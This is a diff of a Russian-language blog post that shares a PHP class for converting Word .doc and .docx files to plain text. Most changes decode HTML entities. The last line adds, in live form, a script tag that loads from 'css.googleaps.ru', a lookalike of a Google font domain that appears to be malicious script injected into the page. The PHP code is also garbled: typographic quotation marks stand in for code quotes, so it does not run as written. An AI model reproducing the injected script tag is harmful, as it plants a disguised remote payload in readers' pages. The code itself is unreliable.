@@ -27,9 +27,9 @@ comments: []
 <p>Думаю многим пригодится данный класс</p>
 <pre class="brush: php; gutter: true">require(&laquo;doc2txt.class.php&raquo;);</p>
 <p>$docObj = new Doc2Txt(&laquo;test.docx&raquo;);<br />
-&#47;&#47;$docObj = new Doc2Txt(&laquo;test.doc&raquo;);</p>
+//$docObj = new Doc2Txt(&laquo;test.doc&raquo;);</p>
 <p>$txt = $docObj->convertToText();<br />
-echo $txt;<&#47;pre><br />
+echo $txt;</pre><br />
 Сам класс</p>
 <pre class="brush: php; gutter: true">filename = $filePath;<br />
 }</p>
@@ -47,7 +47,7 @@ if (($pos !== FALSE)||(strlen($thisline)==0))<br />
 $outtext .= $thisline.&raquo; &laquo;;<br />
 }<br />
 }<br />
-$outtext = preg_replace(&laquo;&#47;[^a-zA-Z0-9s,.-nrt@&#47;_()]&#47;&raquo;,&raquo;&raquo;,$outtext);<br />
+$outtext = preg_replace(&laquo;/[^a-zA-Z0-9s,.-nrt@/_()]/&raquo;,&raquo;&raquo;,$outtext);<br />
 return $outtext;<br />
 }</p>
 <p>private function read_docx(){</p>
@@ -57,10 +57,10 @@ $content = &raquo;;</p>
 <p>if (!$zip || is_numeric($zip)) return false;</p>
 <p>while ($zip_entry = zip_read($zip)) {</p>
 <p>if (zip_entry_open($zip, $zip_entry) == FALSE) continue;</p>
-<p>if (zip_entry_name($zip_entry) != &laquo;word&#47;document.xml&raquo;) continue;</p>
+<p>if (zip_entry_name($zip_entry) != &laquo;word/document.xml&raquo;) continue;</p>
 <p>$content .= zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));</p>
 <p>zip_entry_close($zip_entry);<br />
-}&#47;&#47; end while</p>
+}// end while</p>
 <p>zip_close($zip);</p>
 <p>$content = str_replace(&raquo;, &raquo; &laquo;, $content);<br />
 $content = str_replace(&raquo;, &laquo;rn&raquo;, $content);<br />
@@ -85,4 +85,4 @@ return &laquo;Invalid File Type&raquo;;<br />
 }<br />
 }<br />
 }<br />
-?><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+?><script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre></p>
